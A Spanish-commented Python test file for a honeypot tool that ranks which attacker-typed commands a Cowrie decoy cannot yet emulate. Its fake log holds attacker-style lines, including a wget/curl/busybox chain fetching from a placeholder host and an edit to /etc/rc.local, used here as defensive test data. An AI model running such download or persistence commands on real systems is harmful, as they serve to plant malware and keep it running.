#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
"""
test_que_le_falta.py --- el censo de lo que el senuelo dice tener y no sabe
ejecutar.

    python3 "3.6 Para facilitarnos la vida/tests/test_que_le_falta.py"

Esta herramienta existe para DECIDIR que emular, asi que un fallo suyo no se
nota: se nota meses despues, en forma de trabajo hecho sobre comandos que
nadie teclea y de comandos tecleados que nadie emulo.

Y ya se equivoco una vez, de la forma mas enganosa. La primera version leia el
catalogo del `cmdpatch` del anfitrion, que solo tiene NUESTROS parches, asi
que daba por ausentes wget, curl y uname ---que llevan funcionando desde el
primer dia, porque vienen de fabrica--- y los ponia los primeros de la lista.
Habriamos emulado tres comandos que ya funcionaban. Por eso el catalogo se le
pregunta al contenedor, que es el unico sitio donde conviven los modulos de
fabrica y los nuestros.

Lo que se comprueba:

  - que un comando EMULADO nunca salga como que falta, que es el fallo de
    arriba y el que mas caro sale;
  - que uno que falta y ademas se ha tecleado salga, y ordenado por veces;
  - que las salidas enlatadas de txtcmds cuenten como que SI se sabe ejecutar,
    porque se ejecutan;
  - que de una linea se saquen TODOS los binarios y no solo el primero: en
    `wget X || curl -O X || busybox wget X` hay tres;
  - y que una asignacion de delante (`ARCH=x cmd`) no se cuente como binario.

No toca nada: monta un pickle y un log de mentira en un temporal.
"""

from __future__ import annotations

import importlib.util
import json
import os
import pickle
import shutil
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path

AQUI = Path(__file__).resolve().parent
FUENTE = AQUI.parent / "que_le_falta_al_senuelo.py"

OK = 0
MAL = 0


def comprueba(que, esperado, obtenido):
    global OK, MAL
    if esperado == obtenido:
        OK += 1
        print("  ok    %s" % que)
    else:
        MAL += 1
        print("  FALLO %s\n          esperaba %r\n          obtuvo   %r"
              % (que, esperado, obtenido))


spec = importlib.util.spec_from_file_location("censo", FUENTE)
censo = importlib.util.module_from_spec(spec)
spec.loader.exec_module(censo)

tmp = Path(tempfile.mkdtemp())


# --- un sistema de ficheros de mentira -------------------------------------
# Nodo de Cowrie: [nombre, tipo, uid, gid, tam, modo, ctime, contenido, ...]
def fichero(nombre):
    return [nombre, 0, 0, 0, 1024, 0o100755, 0, None, None, None]


def carpeta(nombre, hijos):
    return [nombre, 1, 0, 0, 4096, 0o40755, 0, hijos, None, None]


raiz = carpeta("", [
    carpeta("usr", [
        carpeta("bin", [fichero(n) for n in
                        ("sed", "ln", "wget", "ls", "dmesg", "tr")]),
        carpeta("sbin", [fichero("sysctl")]),
    ]),
    carpeta("bin", [fichero("cat")]),
])
with open(tmp / "fs.pickle", "wb") as fh:
    pickle.dump(raiz, fh)
censo.PICKLE = str(tmp / "fs.pickle")

# Las salidas enlatadas: dmesg se ejecuta aunque no tenga modulo de Python.
(tmp / "txtcmds" / "usr" / "bin").mkdir(parents=True)
(tmp / "txtcmds" / "usr" / "bin" / "dmesg").write_text("arranque\n", encoding="utf-8")
censo.TXTCMDS = str(tmp / "txtcmds")

# --- y un log de Cowrie de mentira -----------------------------------------
ahora = datetime.now(timezone.utc).isoformat()
lineas = []


def teclea(entrada, veces):
    for _ in range(veces):
        lineas.append(json.dumps({"eventid": "cowrie.command.input",
                                  "timestamp": ahora, "input": entrada}))


teclea("wget http://x/i || curl -O http://x/i || /bin/busybox wget http://x/i", 40)
teclea("sed -i s/a/b/ /etc/rc.local", 12)
teclea("ln -s /tmp/x /usr/bin/x", 7)
teclea("ARCH=x86 sysctl -w kernel.threads-max=1000", 5)
teclea("cat /proc/cpuinfo", 30)
teclea("dmesg", 9)
(tmp / "logs").mkdir()
(tmp / "logs" / "cowrie.json").write_text("\n".join(lineas) + "\n", encoding="utf-8")
censo.LOGS = str(tmp / "logs")

# El contenedor: lo que Cowrie SI sabe ejecutar. Se sustituye la pregunta,
# porque aqui no hay contenedor al que preguntarle.
EMULADOS = {"wget", "curl", "busybox", "ls", "cat", "tr"}
censo.catalogo = lambda: EMULADOS | {"dmesg"}   # dmesg entra por txtcmds

usado = censo.tecleados(90)
dice = censo.declarados()
sabe = censo.catalogo()
faltan = {k: v for k, v in dice.items() if k not in sabe}

print("\nDe una linea salen TODOS los binarios, no solo el primero")
# `wget X || curl -O X || /bin/busybox wget X` son TRES tramos y tres
# binarios: wget, curl y busybox. El segundo "wget" es un ARGUMENTO de
# busybox, no un binario que se invoque, y por eso no se cuenta aparte: quien
# tendria que emularlo es el applet de busybox, que ya existe.
comprueba("wget se cuenta una vez por linea, no dos", 40, usado["wget"])
comprueba("curl tambien", 40, usado["curl"])
comprueba("y busybox, que es quien corre el tercer tramo", 40, usado["busybox"])

print("\nUna asignacion de delante no es un binario")
comprueba("ARCH=x86 no se cuenta", 0, usado["ARCH=x86"])
comprueba("el binario de detras si", 5, usado["sysctl"])

print("\nLo emulado NUNCA sale como que falta")
for cmd in ("wget", "curl", "ls", "cat", "tr"):
    comprueba("%s esta emulado, no puede estar en la lista" % cmd,
              False, cmd in faltan)
comprueba("dmesg tampoco: se ejecuta por txtcmds aunque no tenga modulo",
          False, "dmesg" in faltan)

print("\nLo que falta Y se ha tecleado sale, y por veces")
prioridad = sorted(((k, usado[k]) for k in faltan if usado[k]),
                   key=lambda t: -t[1])
comprueba("el orden es por cuantas veces se tecleo",
          [("sed", 12), ("ln", 7), ("sysctl", 5)], prioridad)

print("\nY lo que falta pero nadie teclea se queda aparte")
comprueba("no hay ninguno mas en este montaje", [],
          sorted(k for k in faltan if not usado[k]))

print("\nEl catalogo se le pregunta al contenedor, no al cmdpatch")
fuente = FUENTE.read_text(encoding="utf-8")
comprueba("se usa docker exec", True, '"docker", "exec", CONTENEDOR' in fuente)
comprueba("y ya no queda la constante que apuntaba al cmdpatch del anfitrion",
          False, "CMDPATCH" in fuente)

shutil.rmtree(tmp, ignore_errors=True)

print("\n-------------------------------------")
print("ok: %d   fallos: %d" % (OK, MAL))
sys.exit(1 if MAL else 0)
